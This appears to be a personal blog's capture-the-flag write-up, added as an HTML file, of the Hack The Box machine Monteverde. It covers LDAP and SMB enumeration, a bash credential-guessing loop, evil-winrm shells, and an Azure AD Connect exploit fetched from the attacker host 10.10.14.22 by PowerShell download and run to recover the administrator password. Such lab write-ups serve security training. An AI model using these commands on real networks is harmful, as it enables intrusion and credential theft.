@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <title>mtnalonso.com - HTB Monteverde</title>
+        <link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="/css/nes.min.css">
+        <link rel="stylesheet" type="text/css" href="/css/styles.css">
+        <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/styles/default.min.css">
+        <script src="/js/script.js"></script>
+        <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script>
+<style>
+    .nes-badge {
+        width: 18em;
+    }
+
+    .container {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .container > h2 {
+        width: 100%;
+    }
+
+    .subsection {
+        width: 90%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        margin: 1em 0em 1em 0em;
+    }
+
+    .subsection > p {
+        width: 100%;
+    }
+
+    .subsection > h3 {
+        width: 100%;
+    }
+
+    .subsection > img {
+        max-width: 80%;
+        margin: 1em;
+    }
+
+    #summary {
+        margin: 1em 0em 2em 0em;
+    }
+
+</style>
+    </head>
+    <body>
+        <nav>
+            <hr>
+            <a class="nes-btn is-error" href="/"><-</a> |
+            <a class="nes-btn is-primary" href="/blog">BLOG</a> |
+            <a class="nes-btn is-success" href="/security">SECURITY</a> |
+            <a class="nes-btn is-warning" href="/about-me">ABOUT ME</a> |
+            <a class="nes-btn" href="/write-ups">WRITE-UPS</a>
+            <hr>
+        </nav>
+        <main>  
+            <h1>Hack The Box - Monteverde</h1>
+            <br>
+            <section id="machine-info" style="display:flex">
+                <div id="machine-img" style="width:50%; display:flex; justify-content:center">
+                    <img src="/img/htb/monteverde/monteverde.png">
+                </div>
+                <div class="nes-container is-rounded with-title" style="width:50%">
+                    <h2 class="title">Machine info</h2>
+                    <p>Operating System: Windows</p>
+                    <p>Difficulty: <span class="nes-text is-warning">Medium</span></p>
+                    <p>Release date: January 11, 2020</p>
+                    <p>IP Address: 10.10.10.172</p>
+                    <br>
+                    <div class="nes-badge"><span class="is-dark">Active Directory</span></div>
+                    <div class="nes-badge"><span class="is-dark">Misconfiguration</span></div>
+                    <div class="nes-badge"><span class="is-dark">SMB</span></div>
+                </div>
+            </section>
+            <br>
+            <section id="summary">
+                <h2><a href="#summary">#</a> Summary</h2>
+                <div class="lists">
+                    <ul class="nes-list is-disc">
+                        <li><a href="#recon">Recon</a></li>
+                        <ul class="nes-list is-circle">
+                            <li>Port scanning</li>
+                            <li>LDAP enumeration: Get valid user credentials</li>
+                            <li>SMB Shares enumeration with found credentials: Get user's Azure password</li>
+                        </ul>
+                        <br>
+                        <li><a href="#machine-access">Machine Access</a></li>
+                        <ul class="nes-list is-circle">
+                            <li>Get reverse shell with found credentials in SMB</li>
+                        </ul>
+                        <br>
+                        <li><a href="#privesc">Privilege Escalation</a></li>
+                        <ul class="nes-list is-circle">
+                            <li>Exploit Azure ADConnect and get the Administrator's password</li>
+                            <li>Get reverse shell as administrator with its password</li>
+                        </ul>
+                    </ul>
+                </div>
+            </section>
+            <section id="recon" class="container">
+                <h2><a href="#recon">1.</a> Recon</h2>
+                <section id="port-scan" class="subsection">
+                    <h3><a href="#port-scan">1.1.</a> Port Scan</h3>
+                    <p>I started with a simple nmap scan that showed me already some interesting services running in the target as SMB and LDAP:</p>
+                    <pre style="width:100%"><code class="hljs bash">
+nmap -Pn -A 10.10.10.172
+                    </code></pre>
+                    <img src="/img/htb/monteverde/a-scan.png">
+                </section>
+                <section id="ldap-enum" class="subsection">
+                    <h3><a href="#ldap-enum">1.2.</a> LDAP Enumeration</h3>
+                    <p>Knowing that the target has LDAP running on it, I run another nmap scan on the machine enabling also the LDAP scripts.</p>
+                    <pre style="width:100%"><code class="hljs bash">
+nmap -n -sV -Pn --script "ldap* and not brute" 10.10.10.172 -oA nmap/ldap
+                    </code></pre>
+                    <img src="/img/htb/monteverde/nmap-ldap.png">
+                    <p>By using then <b>ldapsearch</b> with the domain of the machine, I was able to get some usernames from the domain:</p>
+                    <pre style="width:100%"><code class="hljs bash">
+ldapsearch -x -b "dc=megabank,dc=local" "*" -h 10.10.10.172 &gt; ldap-results.txt
+grep "userPrincipalName" ldap-results.txt
+                    </code></pre>
+                    <img src="/img/htb/monteverde/ldapsearch.png">
+                    <p>Having this information I decided to create a couple of wordlists in order to check if any of those might be valid credentials to log into the SMB shares of the machine.</p>
+                    <pre style="width:100%"><code class="hljs bash">
+grep "userPrincipalName" ldap-results.txt | cut -d ' ' -f 2 | cut -d '@' -f 1 &gt; usernames.txt
+grep "userPrincipalName" ldap-results.txt | cut -d ' ' -f 2 &gt; wordlist.txt
+grep "userPrincipalName" ldap-results.txt | cut -d ' ' -f 2 | cut -d '@' -f 1 &gt;&gt; wordlist.txt 
+                    </code></pre>
+                </section>
+                <section id="smb-enum" class="subsection">
+                    <h3><a href="#smb-enum">1.3.</a> SMB Enumeration</h3>
+                    <p>With both wordlists I could not wait but create a quick bash script that iterates over each username and passwords using <b>smbclient</b> to check the credentials against SMB.</p>
+                    <pre style="width:100%"><code class="hljs bash">
+#!/bin/bash
+
+wordlist_file="wordlist.txt"
+username_file="usernames.txt"
+
+while IFS= read -r username
+do
+    while IFS= read -r password
+    do
+        echo "[*] Trying: $username:$password"
+        smbclient -L \\\\10.10.10.172 -U "$username%$password"
+    done &lt; "$wordlist_file"
+done &lt; "$username_file"
+                    </code></pre>
+                    <p>(Later on I discovered that this was not necessary at all since this can be done directly with <b>CrackMapExec</b>)</p>
+                    <!-- https://0xdf.gitlab.io/2020/06/13/htb-monteverde.html -->
+                    <p style="background-color:cyan">Pop up here</p>
+                    <br>
+                    <p>Running the script it appeared that by using the credentials <b class="nes-text is-primary">SABatchJobs</b>:<b class="nes-text is-primary">SABatchJobs</b> I can list some shares:</p>
+                    <img src="/img/htb/monteverde/list-shares.png">
+                    <p>Testing the same credentials with CrackMapExec it seems those are valid credentials on the system.</p>
+                    <pre style="width:100%"><code class="hljs bash">
+cme smb 10.10.10.172 -u SABatchJobs -p SABatchJobs
+                    </code></pre>
+                    <img src="/img/htb/monteverde/cme.png">
+                    <p>Using <b>smbclient</b>again, this time to browse the <b>user$</b> share with the found credentials, after poking around a little bit an interesting xml file comes up under the <b class="nes-text is-primary">mhope</b> user folder:</p>
+                    <pre style="width:100%"><code class="hljs bash">
+smbclient \\\\10.10.10.172\\user$ -U "SABatchJobs%SABatchJobs"
+                    </code></pre>
+                    <img src="/img/htb/monteverde/smb-shares.png">
+                    <br><br>
+                    <p>Reviewing the <b>azure.xml</b> file, it contained the password <b class="nes-text is-primary">4n0therD4y@n0th3r$</b>!</p>
+                    <img src="/img/htb/monteverde/azure-pass.png">
+                    <p>Testing the credentials <b class="nes-text is-primary">mhope</b>:<b class="nes-text is-primary">4n0therD4y@n0th3r$</b> again with CrackMapExec, seem to be valid credentials!</p>
+                    <img src="/img/htb/monteverde/cme-mhope.png">
+                </section>
+            </section>
+            <section id="machine-access" class="container">
+                <h2><a href="#machine-access">2.</a> Machine Access</h2>
+                <section id="rev-shell" class="subsection">
+                    <h3><a href="#rev-shell">2.1.</a> Reverse shell</h3>
+                    <p>Using <b><a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a></b> with the obtained credentials it was possible to get a PowerShell reverse shell to the attacker machine:</b>
+                    <pre style="width:100%"><code class="hljs bash">
+evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
+                    </code></pre>
+                    <img src="/img/htb/monteverde/evil-winrm.png">
+                    <p>Having user access to the machine I could easily obtain the user's flag under <b>C:\User\mhope\Desktop\user.txt</b>:</p>
+                    <br><br>
+                    <img src="/img/htb/monteverde/user-flag.png">
+                </section>
+            </section>
+            <section id="privesc" class="container">
+                <h2><a href="#privesc">3.</a> Privilege Escalation</h2>
+                <section id="enumeration" class="subsection">
+                    <h3><a href="#privesc">3.1.</a> Enumeration</h3>
+                    <p>After gaining a foolthold on the target and checking <b>mhope</b> user permissions, the user was part of the "<b>Azure admins</b>" group</p>
+                    <pre style="width:100%"><code class="hljs bash">
+net user mhope
+                    </code></pre>
+                    <img src="/img/htb/monteverde/user-priv.png">
+                </section>
+                <section id="adconnect" class="subsection">
+                    <h3><a href="#adconnect">3.2.</a> Exploiting Azure ADConnect</h3>
+                    <p>As <a href="https://twitter.com/vbscrub?lang=en">@VbScrub</a> well explains on <a href="https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">this article</a>, the Azure ADConnect service, responsible for synchronizing the local and Azure AD domains, needs privileged credentials to do so.</p>
+                    <p>With the provided <a href="https://github.com/VbScrub/AdSyncDecrypt/releases">exploit</a> it is possible to obtain the AD account's credentials. In order to do that, it was necessary to download the exploit, start a HTTP server on the attacker machine, and download the executable exploit as well as a DLL file in the target machine as follows:</p>
+                    <pre style="width:100%"><code class="hljs bash">
+# Attacker machine
+wget https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip
+unzip AdDecrypt.zip
+sudo python3 -m http.server 80
+                    </code></pre>
+                    <p><b class="nes-text is-warning">NOTE</b>: as indicated in the previous article, the program has to be run having the AD Sync Bin Folder as the current working directory or having it added to the PATH variable. The library <b>mcrypt.dll</b> has to be on the same directory of the executable.</p>
+                    <pre style="width:100%"><code class="hljs powershell">
+# Target machine    
+(new-object System.Net.WebClient).DownloadFile('http://10.10.14.22/AdDecrypt.exe','C:\Users\mhope\Documents\AdDecrypt.exe')
+(new-object System.Net.WebClient).DownloadFile('http://10.10.14.22/mcrypt.dll','C:\Users\mhope\Documents\mcrypt.dll')
+cd "C:\Program Files\Microsoft Azure AD Sync\Bin"
+C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL
+                    </code></pre>
+                    <img src="/img/htb/monteverde/addecrypt.png">
+                    <p>Got the password for the administrator user: <b class="nes-text is-primary">d0m@in4dminyeah!</b></p>
+                </section>
+                <section id="admin-shell" class="subsection">
+                    <h3><a href="#admin-shell">3.3.</a> Reverse admin shell</h3>
+                    <p>Finally, with the administrator's password it was possible to get a reverse PowerShell shell by using <b>evil-winrm</b> again:</p>
+                    <pre style="width:100%"><code class="hljs bash">
+evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
+                    </code></pre>
+                    <img src="/img/htb/monteverde/admin-shell.png">
+                </section>
+            </section>
+        </main>
+        <!--
+        <footer>
+            <a href="mailto:mtnalonso@pm.me"><i class="nes-icon gmail is-small"></i></a>
+            <a href="https://github.com/mtnalonso"><i class="nes-icon github is-small"></i></a>
+            <a href="https://twitter.com/mtnalonso"><i class="nes-icon twitter is-small"></i></a>
+            <a href="https://www.linkedin.com/in/MartinAlonsoVilar"><i class="nes-icon linkedin is-small"></i></a>
+            <b>Style: <a href="https://nostalgic-css.github.io/NES.css/">NES.css</a></b>
+        </footer>
+        -->
+    </body>
+</html>
